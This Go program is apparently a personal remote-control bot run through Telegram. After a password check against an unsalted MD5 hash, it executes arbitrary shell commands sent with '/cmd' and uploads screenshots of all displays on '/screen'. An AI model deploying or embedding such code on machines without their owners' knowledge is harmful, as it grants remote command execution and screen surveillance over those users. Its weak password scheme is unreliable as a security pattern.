package main

import (
	_ "embed"
	"io"
	"fmt"
	"log"
	"bytes"
	"strconv"
	"strings"
	"os/exec"
	"net/http"
	"image/png"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"mime/multipart"
	"github.com/kbinani/screenshot"

)

var (
	//go:embed pass_md5
	passMd5 string
	//go:embed bot_token
	botToken string
	chatIDs  []int64
	baseURL  = "https://api.telegram.org/bot" + botToken + "/"
	sendfileURL = baseURL + "sendDocument"
)

// Message structure to handle Telegram API messages
type Message struct {
	Chat Chat   `json:"chat"`
	Text string `json:"text"`
}

// Chat structure to hold chat information
type Chat struct {
	ID int64 `json:"id"`
}

// Update structure to handle updates from the Telegram API
type Update struct {
	UpdateID int     `json:"update_id"`
	Message  Message `json:"message"`
}

// Response structure to parse the JSON response from Telegram API
type Response struct {
	OK     bool     `json:"ok"`
	Result []Update `json:"result"`
}

func md5Hash(text string) string {
	// Create a new MD5 hash object
	hash := md5.New()

	// Write the string data to the hash object
	hash.Write([]byte(text))

	// Compute the MD5 checksum
	checksum := hash.Sum(nil)

	// Convert the checksum to a hexadecimal string
	return hex.EncodeToString(checksum)
}

func contains[T comparable](slice []T, item T) bool {
	for _, v := range slice {
		if v == item {
			return true
		}
	}
	return false
}

func SendMessage(chatID int64, text string) error {
	url := baseURL + "sendMessage"
	payload := map[string]interface{}{
		"chat_id": chatID,
		"text":    text,
	}

	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	_ = body
	// log.Printf("SendMessage Response: %s", body)

	return nil
}

func sendDocument(chatID int64, fileName string, fileData []byte) error {
	
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Add chatID to form data
	err := writer.WriteField("chat_id", strconv.FormatInt(chatID, 10))
	if err != nil {
		return err
	}

	// Create form file
	part, err := writer.CreateFormFile("document", fileName)
	if err != nil {
		return err
	}

	// Write file data to form file
	_, err = part.Write(fileData)
	if err != nil {
		return err
	}

	err = writer.Close()
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", sendfileURL, body)
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected status: %s", resp.Status)
	}

	return nil
}

func GetUpdates(offset int) (Response, error) {
	url := baseURL + "getUpdates?offset=" + strconv.Itoa(offset)
	resp, err := http.Get(url)
	if err != nil {
		return Response{}, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return Response{}, err
	}

	var response Response
	err = json.Unmarshal(body, &response)
	if err != nil {
		return Response{}, err
	}

	return response, nil
}

func takeScreenshots(chatID int64) {
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			log.Printf("Error capturing screenshot: %v", err)
			continue
		}

		// Create a buffer to store the image
		var buf bytes.Buffer
		err = png.Encode(&buf, img)
		if err != nil {
			log.Printf("Error encoding image: %v", err)
			continue
		}

		fileName := fmt.Sprintf("screenshot_%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())

		// Send the image to Telegram
		err = sendDocument(chatID, fileName, buf.Bytes())
		if err != nil {
			log.Printf("Error sending document: %v", err)
			continue
		}

		fmt.Printf("Sent screenshot #%d : %v \"%s\"\n", i, bounds, fileName)
	}
}

func executeCommand(chatID int64, commandParts []string) {

	// Execute the command using the first element as the command and the rest as arguments
	cmd := exec.Command(commandParts[0], commandParts[1:]...)
	
	// Will hold the response
	responseStr := ""

	// Get the combined output (stdout + stderr)
	output, err := cmd.CombinedOutput()
	if err != nil {
		responseStr = fmt.Sprintf("Error: %v", err)
		responseStr += "\n" + string(output)
	} else {
	responseStr = string(output)
	}
	// Send message to server
	SendMessage(chatID, responseStr)
}

func parseCommand(text string, chatID int64) {
	commandParts := strings.Split(text, " ")
	commandType := commandParts[0]
	switch commandType {
	case "/cmd":
		executeCommand(chatID, commandParts[1:])
	case "/screen":
		takeScreenshots(chatID)
	default:
		SendMessage(chatID, "No such command 🥴")
	}
}

func main() {

	fmt.Println("Bot started. Press Ctrl+C to stop.")
	offset := 0

	for {
		updates, err := GetUpdates(offset)
		if err != nil {
			log.Fatalf("Error fetching updates: %v", err)
		}

		for _, update := range updates.Result {
			offset = update.UpdateID + 1
			chatID := update.Message.Chat.ID
			text := update.Message.Text
			if contains(chatIDs, chatID) {
				parseCommand(text, chatID)
			} else if md5Hash(text) == passMd5 {
				fmt.Println("Password answered in Chat ID:", chatID)
				chatIDs = append(chatIDs, chatID)
				responseText := "Password confirmed. Pishoto is welcoming you 🤖"
				err := SendMessage(chatID, responseText)
				if err != nil {
					log.Fatalf("Error sending message: %v", err)
				}
			} else {
				responseText := "Wrong password."
				SendMessage(chatID, responseText)
			}
		}
	}
}
